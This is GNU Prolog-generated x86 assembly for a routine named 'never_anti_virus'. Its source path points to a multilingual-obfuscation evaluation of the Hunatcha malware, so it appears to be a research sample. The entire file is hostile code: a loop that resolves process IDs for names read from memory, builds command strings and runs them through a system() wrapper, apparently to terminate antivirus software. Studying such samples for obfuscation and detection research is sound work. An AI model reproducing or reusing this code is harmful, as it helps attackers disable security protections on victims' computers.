	.text	

fail:
	movl	pl_reg_bank+1024,%eax
	jmp	*-4(%eax)
	.p2align	4,,15
	.type	X0_never_anti_virus__a1,@function
.globl X0_never_anti_virus__a1

X0_never_anti_virus__a1:
	movl	pl_reg_bank+0,%eax
	movl	%eax,pl_reg_bank+4
	movl	at+12,%eax
	movl	%eax,0(%esp)
	movl	$2,4(%esp)
	call	Pl_Set_Bip_Name_Untagged_2
	movl	$-2147483645,%eax
	call	Pl_Put_Integer_Tagged
	movl	%eax,pl_reg_bank+0
	jmp	X0_loop__a2
	.p2align	4,,15
	.type	X0_loop__a2,@function
.globl X0_loop__a2

X0_loop__a2:
	movl	$Lpred2_1+0,%eax
	call	Pl_Create_Choice_Point2
	movl	$4,%eax
	call	Pl_Allocate
	movl	pl_reg_bank+0,%eax
	movl	pl_reg_bank+1040,%edi
	movl	%eax,-16(%edi)
	movl	pl_reg_bank+4,%eax
	movl	%eax,-20(%edi)
	movl	at+12,%eax
	movl	%eax,0(%esp)
	movl	$2,4(%esp)
	call	Pl_Set_Bip_Name_Untagged_2
	movl	-20(%edi),%eax
	leal	pl_reg_bank+0,%edx
	call	Pl_Math_Load_Value
	movl	-16(%edi),%eax
	leal	pl_reg_bank+4,%edx
	call	Pl_Math_Load_Value
	movl	$-2147483629,%eax
	call	Pl_Put_Integer_Tagged
	movl	%eax,pl_reg_bank+8
	movl	pl_reg_bank+4,%eax
	movl	pl_reg_bank+8,%edx
	call	Pl_Fct_Mul
	movl	%eax,pl_reg_bank+4
	movl	pl_reg_bank+0,%eax
	movl	pl_reg_bank+4,%edx
	call	Pl_Fct_Add
	movl	%eax,pl_reg_bank+0
	leal	-24(%edi),%eax
	call	Pl_Put_Y_Variable
	movl	%eax,pl_reg_bank+4
	movl	$.Lcont0,pl_reg_bank+1036
	jmp	X0_string_ptr_dereference__a2
.Lcont0:
	movl	at+20,%eax
	movl	%eax,0(%esp)
	movl	$2,4(%esp)
	call	Pl_Set_Bip_Name_Untagged_2
	movl	pl_reg_bank+1040,%edi
	movl	-24(%edi),%eax
	leal	pl_reg_bank+0,%edx
	call	Pl_Math_Load_Value
	movl	$-2147483645,%eax
	call	Pl_Put_Integer_Tagged
	movl	%eax,pl_reg_bank+4
	movl	pl_reg_bank+0,%eax
	movl	pl_reg_bank+4,%edx
	call	Pl_Blt_Neq
	testl	%eax,%eax
	je	fail
	movl	-24(%edi),%eax
	movl	%eax,pl_reg_bank+0
	leal	-28(%edi),%eax
	call	Pl_Put_Y_Variable
	movl	%eax,pl_reg_bank+4
	movl	$.Lcont1,pl_reg_bank+1036
	jmp	X0_findprocessid_wrapper__a2
.Lcont1:
	movl	pl_reg_bank+1040,%edi
	movl	-28(%edi),%eax
	movl	%eax,pl_reg_bank+0
	movl	$.Lcont2,pl_reg_bank+1036
	jmp	X1_246C6F6F702F325F2461757831__a1
.Lcont2:
	movl	at+12,%eax
	movl	%eax,0(%esp)
	movl	$2,4(%esp)
	call	Pl_Set_Bip_Name_Untagged_2
	movl	pl_reg_bank+1040,%edi
	movl	-16(%edi),%eax
	leal	pl_reg_bank+0,%edx
	call	Pl_Math_Load_Value
	movl	pl_reg_bank+0,%eax
	call	Pl_Fct_Inc
	movl	%eax,pl_reg_bank+0
	movl	-20(%edi),%eax
	movl	%eax,pl_reg_bank+4
	call	Pl_Deallocate
	jmp	X0_loop__a2

Lpred2_1:
	call	Pl_Delete_Choice_Point2
	movl	$0,%eax
	call	Pl_Allocate
	movl	at+12,%eax
	movl	%eax,0(%esp)
	movl	$2,4(%esp)
	call	Pl_Set_Bip_Name_Untagged_2
	movl	pl_reg_bank+4,%eax
	leal	pl_reg_bank+4,%edx
	call	Pl_Math_Load_Value
	movl	pl_reg_bank+0,%eax
	leal	pl_reg_bank+0,%edx
	call	Pl_Math_Load_Value
	movl	$-2147483629,%eax
	call	Pl_Put_Integer_Tagged
	movl	%eax,pl_reg_bank+8
	movl	pl_reg_bank+0,%eax
	movl	pl_reg_bank+8,%edx
	call	Pl_Fct_Mul
	movl	%eax,pl_reg_bank+0
	movl	pl_reg_bank+4,%eax
	movl	pl_reg_bank+0,%edx
	call	Pl_Fct_Add
	movl	%eax,pl_reg_bank+0
	call	Pl_Put_X_Variable
	movl	%eax,pl_reg_bank+4
	movl	$.Lcont3,pl_reg_bank+1036
	jmp	X0_string_ptr_dereference__a2
.Lcont3:
	movl	fn+0,%eax
	call	Pl_Put_Structure_Tagged
	movl	%eax,pl_reg_bank+0
	movl	$1,%eax
	call	Pl_Unify_Void
	movl	$-2147483645,%eax
	call	Pl_Unify_Integer_Tagged
	testl	%eax,%eax
	je	fail
	call	Pl_Deallocate
	jmp	X1_5C5C2B__a1
	.p2align	4,,15
	.type	X1_246C6F6F702F325F2461757831__a1,@function

X1_246C6F6F702F325F2461757831__a1:
	movl	$Lpred3_1+0,%eax
	call	Pl_Create_Choice_Point1
	movl	$1,%eax
	call	Pl_Allocate
	movl	at+20,%eax
	movl	%eax,0(%esp)
	movl	$2,4(%esp)
	call	Pl_Set_Bip_Name_Untagged_2
	movl	pl_reg_bank+0,%eax
	leal	pl_reg_bank+4,%edx
	call	Pl_Math_Load_Value
	movl	$-2147483645,%eax
	call	Pl_Put_Integer_Tagged
	movl	%eax,pl_reg_bank+8
	movl	pl_reg_bank+4,%eax
	movl	pl_reg_bank+8,%edx
	call	Pl_Blt_Neq
	testl	%eax,%eax
	je	fail
	movl	pl_reg_bank+1040,%edi
	leal	-16(%edi),%eax
	call	Pl_Put_Y_Variable
	movl	%eax,pl_reg_bank+4
	movl	$.Lcont4,pl_reg_bank+1036
	jmp	X0_sprintf_wrapper__a2
.Lcont4:
	movl	pl_reg_bank+1040,%edi
	movl	-16(%edi),%eax
	call	Pl_Put_Unsafe_Value
	movl	%eax,pl_reg_bank+0
	call	Pl_Deallocate
	jmp	X0_system_wrapper__a1

Lpred3_1:
	call	Pl_Delete_Choice_Point1
	jmp	X0_nl__a0
	.p2align	4,,15
	.type	X0_findprocessid_wrapper__a2,@function
.globl X0_findprocessid_wrapper__a2

X0_findprocessid_wrapper__a2:
	movl	$.LC0,0(%esp)
	movl	$2,4(%esp)
	call	Pl_Set_C_Bip_Name
	movl	pl_reg_bank+0,%eax
	movl	%eax,0(%esp)
	call	Pl_Rd_String_Check
	movl	%eax,pl_foreign_long+0
	movl	pl_reg_bank+4,%eax
	movl	%eax,0(%esp)
	call	Pl_Check_For_Un_Integer
	movl	pl_foreign_long+0,%eax
	movl	%eax,0(%esp)
	movl	$pl_foreign_long+4,4(%esp)
	call	findprocessid_wrapper
	testl	%eax,%eax
	je	fail
	movl	pl_foreign_long+4,%eax
	movl	%eax,0(%esp)
	movl	pl_reg_bank+4,%eax
	movl	%eax,4(%esp)
	call	Pl_Un_Integer
	testl	%eax,%eax
	je	fail
	jmp	*pl_reg_bank+1036
	.p2align	4,,15
	.type	X0_string_ptr_dereference__a2,@function
.globl X0_string_ptr_dereference__a2

X0_string_ptr_dereference__a2:
	movl	$.LC1,0(%esp)
	movl	$2,4(%esp)
	call	Pl_Set_C_Bip_Name
	movl	pl_reg_bank+0,%eax
	movl	%eax,0(%esp)
	call	Pl_Rd_Float_Check
	fstpl	pl_foreign_double+0
	movl	pl_reg_bank+4,%eax
	movl	%eax,0(%esp)
	call	Pl_Check_For_Un_String
	movl	pl_foreign_double+0,%eax
	movl	%eax,0(%esp)
	movl	pl_foreign_double+4,%eax
	movl	%eax,4(%esp)
	movl	$pl_foreign_long+4,8(%esp)
	call	string_ptr_dereference
	testl	%eax,%eax
	je	fail
	movl	pl_foreign_long+4,%eax
	movl	%eax,0(%esp)
	movl	pl_reg_bank+4,%eax
	movl	%eax,4(%esp)
	call	Pl_Un_String
	testl	%eax,%eax
	je	fail
	jmp	*pl_reg_bank+1036
	.p2align	4,,15
	.type	X0_sprintf_wrapper__a2,@function
.globl X0_sprintf_wrapper__a2

X0_sprintf_wrapper__a2:
	movl	$.LC2,0(%esp)
	movl	$2,4(%esp)
	call	Pl_Set_C_Bip_Name
	movl	pl_reg_bank+0,%eax
	movl	%eax,0(%esp)
	call	Pl_Rd_Integer_Check
	movl	%eax,pl_foreign_long+0
	movl	pl_reg_bank+4,%eax
	movl	%eax,0(%esp)
	call	Pl_Check_For_Un_String
	movl	pl_foreign_long+0,%eax
	movl	%eax,0(%esp)
	movl	$pl_foreign_long+4,4(%esp)
	call	sprintf_wrapper
	testl	%eax,%eax
	je	fail
	movl	pl_foreign_long+4,%eax
	movl	%eax,0(%esp)
	movl	pl_reg_bank+4,%eax
	movl	%eax,4(%esp)
	call	Pl_Un_String
	testl	%eax,%eax
	je	fail
	jmp	*pl_reg_bank+1036
	.p2align	4,,15
	.type	X0_system_wrapper__a1,@function
.globl X0_system_wrapper__a1

X0_system_wrapper__a1:
	movl	$.LC3,0(%esp)
	movl	$1,4(%esp)
	call	Pl_Set_C_Bip_Name
	movl	pl_reg_bank+0,%eax
	movl	%eax,0(%esp)
	call	Pl_Rd_String_Check
	movl	%eax,pl_foreign_long+0
	movl	pl_foreign_long+0,%eax
	movl	%eax,0(%esp)
	call	system_wrapper
	testl	%eax,%eax
	je	fail
	jmp	*pl_reg_bank+1036
	.p2align	4,,15
	.type	X0_char_ptr_dereference__a2,@function
.globl X0_char_ptr_dereference__a2

X0_char_ptr_dereference__a2:
	movl	$.LC4,0(%esp)
	movl	$2,4(%esp)
	call	Pl_Set_C_Bip_Name
	movl	pl_reg_bank+0,%eax
	movl	%eax,0(%esp)
	call	Pl_Rd_Float_Check
	fstpl	pl_foreign_double+0
	movl	pl_reg_bank+4,%eax
	movl	%eax,0(%esp)
	call	Pl_Check_For_Un_Char
	movl	pl_foreign_double+0,%eax
	movl	%eax,0(%esp)
	movl	pl_foreign_double+4,%eax
	movl	%eax,4(%esp)
	movl	$pl_foreign_long+4,8(%esp)
	call	char_ptr_dereference
	testl	%eax,%eax
	je	fail
	movl	pl_foreign_long+4,%eax
	movl	%eax,0(%esp)
	movl	pl_reg_bank+4,%eax
	movl	%eax,4(%esp)
	call	Pl_Un_Char
	testl	%eax,%eax
	je	fail
	jmp	*pl_reg_bank+1036
	.p2align	4,,15
	.type	ensure_linked,@function

ensure_linked:
	jmp	X1_24666F7263655F666F726569676E5F6C696E6B__a0
	.p2align	4,,15
	.type	Object_Initializer,@function

Object_Initializer:
	pushl	%esi
	subl	$132,%esp
	movl	$Prolog_Object_Initializer+0,0(%esp)
	movl	$System_Directives+0,4(%esp)
	movl	$User_Directives+0,8(%esp)
	call	Pl_New_Object
	addl	$132,%esp
	popl	%esi
	ret	
	.p2align	4,,15
	.type	Prolog_Object_Initializer,@function

Prolog_Object_Initializer:
	pushl	%esi
	subl	$132,%esp
	movl	$.LC5,0(%esp)
	call	Pl_Create_Atom
	movl	%eax,at+24
	movl	$.LC6,0(%esp)
	call	Pl_Create_Atom
	movl	%eax,at+0
	movl	$.LC7,0(%esp)
	call	Pl_Create_Atom
	movl	%eax,at+20
	movl	$.LC4,0(%esp)
	call	Pl_Create_Atom
	movl	%eax,at+44
	movl	$.LC0,0(%esp)
	call	Pl_Create_Atom
	movl	%eax,at+28
	movl	$.LC8,0(%esp)
	call	Pl_Create_Atom
	movl	%eax,at+12
	movl	$.LC9,0(%esp)
	call	Pl_Create_Atom
	movl	%eax,at+16
	movl	$.LC10,0(%esp)
	call	Pl_Create_Atom
	movl	%eax,at+4
	movl	$.LC2,0(%esp)
	call	Pl_Create_Atom
	movl	%eax,at+36
	movl	$.LC1,0(%esp)
	call	Pl_Create_Atom
	movl	%eax,at+32
	movl	$.LC3,0(%esp)
	call	Pl_Create_Atom
	movl	%eax,at+40
	movl	$.LC11,0(%esp)
	call	Pl_Create_Atom
	movl	%eax,at+8
	movl	$.LC7,%eax
	movl	$2,%edx
	call	Pl_Create_Functor_Arity_Tagged
	movl	%eax,fn+0
	movl	at+4,%eax
	movl	$1,%edx
	movl	at+0,%ecx
	movl	$7,0(%esp)
	movl	$129,4(%esp)
	movl	$X0_never_anti_virus__a1+0,8(%esp)
	call	Pl_Create_Pred
	movl	at+16,%eax
	movl	$2,%edx
	movl	at+0,%ecx
	movl	$9,0(%esp)
	movl	$129,4(%esp)
	movl	$X0_loop__a2+0,8(%esp)
	call	Pl_Create_Pred
	movl	at+24,%eax
	movl	$1,%edx
	movl	at+0,%ecx
	movl	$9,0(%esp)
	movl	$1,4(%esp)
	movl	$X1_246C6F6F702F325F2461757831__a1+0,8(%esp)
	call	Pl_Create_Pred
	movl	at+28,%eax
	movl	$2,%edx
	movl	at+0,%ecx
	movl	$1,0(%esp)
	movl	$129,4(%esp)
	movl	$X0_findprocessid_wrapper__a2+0,8(%esp)
	call	Pl_Create_Pred
	movl	at+32,%eax
	movl	$2,%edx
	movl	at+0,%ecx
	movl	$2,0(%esp)
	movl	$129,4(%esp)
	movl	$X0_string_ptr_dereference__a2+0,8(%esp)
	call	Pl_Create_Pred
	movl	at+36,%eax
	movl	$2,%edx
	movl	at+0,%ecx
	movl	$3,0(%esp)
	movl	$129,4(%esp)
	movl	$X0_sprintf_wrapper__a2+0,8(%esp)
	call	Pl_Create_Pred
	movl	at+40,%eax
	movl	$1,%edx
	movl	at+0,%ecx
	movl	$4,0(%esp)
	movl	$129,4(%esp)
	movl	$X0_system_wrapper__a1+0,8(%esp)
	call	Pl_Create_Pred
	movl	at+44,%eax
	movl	$2,%edx
	movl	at+0,%ecx
	movl	$5,0(%esp)
	movl	$129,4(%esp)
	movl	$X0_char_ptr_dereference__a2+0,8(%esp)
	call	Pl_Create_Pred
	addl	$132,%esp
	popl	%esi
	ret	
	.p2align	4,,15
	.type	System_Directives,@function

System_Directives:
	pushl	%esi
	subl	$132,%esp
	addl	$132,%esp
	popl	%esi
	ret	
	.p2align	4,,15
	.type	User_Directives,@function

User_Directives:
	pushl	%esi
	subl	$132,%esp
	addl	$132,%esp
	popl	%esi
	ret	
	.section	.ctors,"aw",@progbits
	.align	4
	.long	Object_Initializer
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC5:
	.string	"$loop/2_$aux1"
.LC6:
	.string	"/home/yufeijiang/Dropbox/security thursday/multilingual obfuscation/babel/evaluation/hunacha/hunatcha/translation/neverantivirus.pl"
.LC7:
	.string	"=\\="
.LC4:
	.string	"char_ptr_dereference"
.LC0:
	.string	"findprocessid_wrapper"
.LC8:
	.string	"is"
.LC9:
	.string	"loop"
.LC10:
	.string	"never_anti_virus"
.LC2:
	.string	"sprintf_wrapper"
.LC1:
	.string	"string_ptr_dereference"
.LC3:
	.string	"system_wrapper"
.LC11:
	.string	"user"
	.data	
	.align	4
	.local	at
	.comm	at,48,4
	.local	fn
	.comm	fn,4,4
	.section	.note.GNU-stack,"",@progbits
